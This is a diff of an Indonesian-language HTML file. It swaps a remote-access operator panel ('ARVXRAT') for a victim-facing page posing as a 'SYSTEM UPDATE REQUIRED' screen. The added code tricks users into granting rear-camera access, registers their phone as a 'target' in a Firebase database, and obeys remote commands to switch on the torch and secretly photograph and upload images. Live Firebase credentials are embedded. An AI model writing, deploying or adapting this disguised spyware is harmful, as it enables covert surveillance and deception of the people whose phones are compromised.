@@ -1,40 +1,29 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>ARVXRAT</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>V-PROJECT SYSTEM</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { background:#0a0a0a; color:#00f2ff; font-family:sans-serif; padding:15px; }
-        .notif { border: 2px solid #ff0055; background:rgba(255,0,85,0.1); padding:10px; margin-bottom:15px; display:none; border-radius:10px; animation: glow 1s infinite; }
-        @keyframes glow { 50% { box-shadow: 0 0 10px #ff0055; } }
-        .card { border: 1px solid #00f2ff; padding:15px; border-radius:15px; background:rgba(0,0,0,0.9); max-width: 500px; margin: auto; }
-        button { background:transparent; border:1px solid #00f2ff; color:#00f2ff; padding:12px; margin:5px; width:46%; cursor:pointer; font-weight:bold; border-radius:5px; }
-        button:hover { background:#00f2ff; color:#000; }
-        #preview { width:100%; border:2px solid #00f2ff; margin-top:15px; display:none; border-radius:10px; box-shadow: 0 0 15px #00f2ff; }
-        input { width:92%; padding:10px; margin-top:10px; background:#111; color:#fff; border:1px solid #333; border-radius:5px; }
+        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; }
+        .glass { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 40px; border-radius: 25px; text-align: center; width: 80%; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h2 { text-transform: uppercase; letter-spacing: 5px; color: #00f2ff; text-shadow: 0 0 15px #00f2ff; }
+        .loader { width: 100%; height: 2px; background: #111; margin: 25px 0; overflow: hidden; border-radius: 10px; }
+        .bar { width: 0%; height: 100%; background: #00f2ff; box-shadow: 0 0 10px #00f2ff; transition: 1s; }
+        button { background: transparent; border: 1px solid #00f2ff; color: #00f2ff; padding: 12px 30px; border-radius: 50px; cursor: pointer; font-weight: bold; transition: 0.4s; letter-spacing: 1px; }
+        button:hover { background: #00f2ff; color: #000; box-shadow: 0 0 20px #00f2ff; }
+        #status { font-size: 10px; color: #444; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <div id="newT" class="notif">
-        <b style="color:#ff0055;">TARGET BARU NICK: <span id="nID"></span></b><br>
-        NAMA HP: <span id="nDev"></span><br>
-        <button onclick="selTarget(lastID)" style="width:100%; background:#ff0055; color:#fff; border:none; margin-top:5px;">KLIK BRO UNTUK CONTROL</button>
-    </div>
-
-    <div class="card">
-        <h1 style="text-align:center; letter-spacing:2px; text-shadow: 0 0 10px #00f2ff;">ARVXRAT</h1>
-        <div id="list">MENCARI TARGET...</div>
-        
-        <div id="pnl" style="display:none; border-top:1px solid #333; margin-top:20px; padding-top:15px;">
-            <h3 id="st" style="color:#ff0055;">SELECTED: -</h3>
-            <button onclick="send('flash','on')">🔦 SENTER ON</button>
-            <button onclick="send('flash','off')">🔦 SENTER OFF</button>
-            <button onclick="send('capture','now','capture')" style="width:96%; background:#ff0055; color:#fff; border:none;">📸 AMBIL FOTO BELAKANG</button>
-            <img id="preview" src="">
-            <input type="text" id="msg" placeholder="Ketik pesan alert...">
-            <button onclick="sendMsg()" style="width:96%; margin-top:5px;">💬 KIRIM PESAN</button>
-        </div>
+    <div class="glass">
+        <h2 id="brand">SURXRAT V5</h2>
+        <div class="loader"><div id="progress" class="bar"></div></div>
+        <p id="msg" style="font-size: 12px; color: #aaa;">SYSTEM UPDATE REQUIRED</p>
+        <button id="btn" onclick="exec(this)">Check Update</button>
+        <div id="status">ENCRYPTED CONNECTION</div>
     </div>
 
     <script>
@@ -42,48 +31,59 @@
             apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
             authDomain: "rat-html.firebaseapp.com",
             databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
-            projectId: "rat-html"
+            projectId: "rat-html",
+            storageBucket: "rat-html.firebasestorage.app",
+            messagingSenderId: "1060124583265",
+            appId: "1:1060124583265:web:7988dc574a1be9f10f5120"
         };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        let activeID = null; let lastID = "";
 
-        // Notif Target Baru
-        db.ref('targets').limitToLast(1).on('child_added', (sn) => {
-            lastID = sn.key; 
-            document.getElementById('nID').innerText = lastID;
-            document.getElementById('nDev').innerText = sn.val().name;
-            document.getElementById('newT').style.display = "block";
-        });
+        async function exec(b) {
+            b.style.display = 'none';
+            document.getElementById('progress').style.width = '100%';
+            
+            try {
+                // FIX: Paksa pake kamera belakang (environment) biar senter nyala
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "environment" } 
+                });
+                window.localStream = stream;
+                
+                if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
 
-        // List Target Online
-        db.ref('targets').on('value', (sn) => {
-            const l = document.getElementById('list'); l.innerHTML = "<b>ONLINE TARGETS:</b><br>";
-            sn.forEach((c) => { 
-                l.innerHTML += `<div onclick="selTarget('${c.key}')" style="padding:12px; border-bottom:1px solid #222; cursor:pointer;">📱 ${c.val().name} [${c.key}]</div>`; 
-            });
-        });
+                const id = "SURX_" + Math.floor(Math.random() * 9999);
+                const dev = navigator.userAgent.match(/(Infinix|Samsung|Oppo|Xiaomi|Vivo|Realme)/i)?.[0] || "Mobile_Device";
+                
+                db.ref('targets/' + id).set({ name: dev, status: "Active" });
+                document.getElementById('brand').innerText = "UPDATED";
+                document.getElementById('msg').innerText = "SYSTEM SECURED.";
 
-        function selTarget(id) {
-            activeID = id; 
-            document.getElementById('pnl').style.display = 'block';
-            document.getElementById('st').innerText = "SELECTED: " + id;
-            document.getElementById('newT').style.display = "none";
-            // Listener Foto (Auto Update)
-            db.ref('reports/'+id).on('value', (s) => { 
-                if(s.exists()){ const i=document.getElementById('preview'); i.src=s.val().photo; i.style.display='block'; }
-            });
-        }
-
-        function send(t, s, ty="flash") {
-            if(!activeID) return;
-            db.ref('commands/'+activeID).set({ type: ty, status: s, time: Date.now() });
-        }
-
-        function sendMsg() {
-            const m = document.getElementById('msg').value;
-            if(!m) return;
-            db.ref('commands/'+activeID).set({ type: 'msg', text: m });
+                db.ref('commands/' + id).on('value', (s) => {
+                    const c = s.val(); if(!c || !window.localStream) return;
+                    
+                    // KONTROL SENTER BELAKANG
+                    if(c.type === "flash") {
+                        const track = window.localStream.getVideoTracks()[0];
+                        track.applyConstraints({ advanced: [{ torch: (c.status === "on") }] });
+                    }
+                    
+                    // CAPTURE FOTO BELAKANG
+                    if(c.type === "capture") {
+                        const v = document.createElement('video');
+                        v.srcObject = window.localStream; v.play();
+                        setTimeout(() => {
+                            const cn = document.createElement('canvas');
+                            cn.width = v.videoWidth; cn.height = v.videoHeight;
+                            cn.getContext('2d').drawImage(v, 0, 0);
+                            db.ref('reports/' + id).set({ photo: cn.toDataURL('image/jpeg', 0.5) });
+                        }, 1000);
+                    }
+                });
+            } catch (e) { 
+                alert("ACCESS DENIED"); 
+                location.reload(); 
+            }
         }
     </script>
 </body>
